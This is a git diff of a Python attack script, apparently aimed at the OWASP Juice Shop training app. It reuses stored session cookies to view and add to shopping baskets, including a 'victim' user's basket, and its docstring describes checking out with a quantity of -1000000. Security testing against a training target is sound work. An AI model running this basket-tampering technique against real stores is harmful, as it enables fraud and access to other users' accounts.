@@ -19,7 +19,6 @@ step1. login using user A's cookies and headers
 step2. Set the quantity of sth in your basket to be -1000000
 setp3. Set address and checkout
 """
-import json
 
 from plugins import attack as a
 from plugins import login as usrLogin
@@ -27,17 +26,16 @@ import urllib3
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 import random
 
-from urllib import parse
 
 class manipulate_basket(a.attack_inter):
     def __init__(self):
         self.juice_session = a.requests.session()
         #usr = usrLogin.test_user_login_class()
         #res, self.cookie, self.header = usr.first_login()
-        self.email = 'test257@gmail.com'
+        self.email = 'test66@gmail.com'
         self.cookie, self.header = a.auth_load(self.email)
         self.basketId = a.bid_load(self.email)
-        self.victimEmail = 'test257@gmail.com'
+        self.victimEmail = 'test334@gmail.com'
         self.victimBid = a.bid_load(self.victimEmail)
 
     def view_basket(self, basektId):
@@ -47,7 +45,7 @@ class manipulate_basket(a.attack_inter):
             productIds = []
             url = a.URL + '/rest/basket/' + str(basektId)
             response = self.juice_session.get(url, cookies=self.cookie, headers=self.header)
-            print(response.text)
+            # print(response.text)
             products = response.json()["data"]["Products"]
             for i in range( len(products) ):
                 item = products[i]
@@ -72,7 +70,7 @@ class manipulate_basket(a.attack_inter):
 
     def addto_basket(self, quantity):
         print('---------------------------------------------------')
-        #print("Let us add to basket ID {} ----------------".format(self.victimBid))
+        print("Let us add to basket ID {} ----------------".format(self.basketId))
         try:
             productId = self.generate_productID(self.basketId)
             print("we will add product Id {} ".format(productId))
@@ -90,8 +88,6 @@ class manipulate_basket(a.attack_inter):
         except:
             print("2")
 
-
-
     def manipulate_basket(self):
         pass
 
@@ -99,11 +95,8 @@ class manipulate_basket(a.attack_inter):
         pass
 
     def run(self):
-        #print("bein")
-        #self.view_basket(self.basketId)
-        print("hello")
-        self.addto_basket(1)
-        #self.view_basket("2")
+        self.view_basket(self.basketId)
+        self.addto_basket(quantity=1)
 
 
 
